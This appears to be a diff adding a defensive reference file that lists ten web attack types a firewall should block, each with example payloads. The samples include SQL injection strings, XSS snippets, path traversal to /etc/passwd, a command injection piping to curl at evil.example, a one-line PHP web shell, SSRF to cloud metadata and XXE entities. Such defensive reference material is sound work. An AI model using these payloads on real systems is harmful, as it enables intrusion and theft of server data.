@@ -1,0 +1,129 @@
+Typical attacks that the WAF should block
+======================================
+
+1. SQL Injection
+Description:
+- An attacker inserts SQL syntax into input fields, URL parameters, or request bodies.
+- The goal is to bypass authentication, read sensitive data, or modify the database.
+
+Examples:
+- ' OR '1'='1
+- UNION SELECT username, password FROM users
+- DROP TABLE users;
+- admin'--
+
+Why the WAF should block it:
+- These payloads contain SQL keywords and logical operators that are classic indicators of SQL injection.
+
+2. XSS (Cross-Site Scripting)
+Description:
+- An attacker injects JavaScript into a page that other users view.
+- The goal is to steal cookies, impersonate users, or execute malicious scripts in the browser.
+
+Examples:
+- <script>alert('xss')</script>
+- <img src=x onerror=alert(1)>
+- javascript:alert(1)
+- <svg/onload=alert(1)>
+
+Why the WAF should block it:
+- These payloads contain HTML tags and JavaScript patterns commonly used in XSS attacks.
+
+3. Path Traversal
+Description:
+- An attacker tries to escape the intended directory structure to access files on the server.
+- The goal is to read configuration files, secrets, or other sensitive local files.
+
+Examples:
+- ../../etc/passwd
+- ..\\..\\windows\\win.ini
+- %2e%2e%2fetc%2fpasswd
+- /var/www/html/config.php
+
+Why the WAF should block it:
+- Patterns such as ../, ..\\, %2e%2e, /etc/passwd, and /proc/self are common traversal indicators.
+
+4. Command Injection
+Description:
+- An attacker injects shell commands into request parameters.
+- The goal is to force the server to execute operating system commands.
+
+Examples:
+- ; cat /etc/passwd
+- && whoami
+- | curl http://evil.example
+
+Why the WAF should block it:
+- Characters like ;, |, && and commands such as whoami, curl, or cat are strong indicators of command injection.
+
+5. Web Shell / Upload Abuse
+Description:
+- An attacker tries to upload or execute a web shell or other malicious script.
+
+Examples:
+- <?php system($_GET['cmd']); ?>
+- <form action="/upload" method="post">...</form>
+- shell.php
+
+Why the WAF should block it:
+- These payloads often include server-side script patterns or upload-related content that should not be allowed.
+
+6. SSRF (Server-Side Request Forgery)
+Description:
+- An attacker tricks the server into making requests to internal or restricted resources.
+- The goal is to access localhost, cloud metadata endpoints, or internal services.
+
+Examples:
+- http://169.254.169.254/latest/meta-data/
+- http://127.0.0.1:8080/admin
+- http://localhost:22
+
+Why the WAF should block it:
+- These URLs target internal or private network resources and are common SSRF indicators.
+
+7. Open Redirect / Header Injection
+Description:
+- An attacker tries to redirect users to malicious sites or manipulate HTTP headers.
+
+Examples:
+- https://evil.example
+- \r\nSet-Cookie: admin=true
+- Location: https://phishing.example
+
+Why the WAF should block it:
+- These patterns can indicate redirection abuse or HTTP header manipulation.
+
+8. XML / XXE-like payloads
+Description:
+- An attacker uses XML structures to access local files or external resources.
+
+Examples:
+- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example">]>
+
+Why the WAF should block it:
+- XML DOCTYPE/ENTITY/SYSTEM patterns are typical signs of XXE-style abuse.
+
+9. Header Manipulation / Abuse
+Description:
+- An attacker modifies or abuses HTTP headers such as Host, Referer, or X-Forwarded-Host.
+
+Examples:
+- X-Forwarded-Host: evil.com
+- Referer: javascript:alert(1)
+- Host: localhost@evil.example
+
+Why the WAF should block it:
+- Suspicious headers can be used to bypass application logic or deceive downstream components.
+
+10. Bot / Abuse patterns
+Description:
+- An attacker sends a large number of automated requests to scan, brute-force, or overload the site.
+
+Examples:
+- repeated requests to /login with many payloads
+- user-agent containing common scanner signatures
+- high-volume repeated GET or POST requests
+
+Why the WAF should block it:
+- These patterns are typical of automated abuse and can indicate reconnaissance or attack attempts.
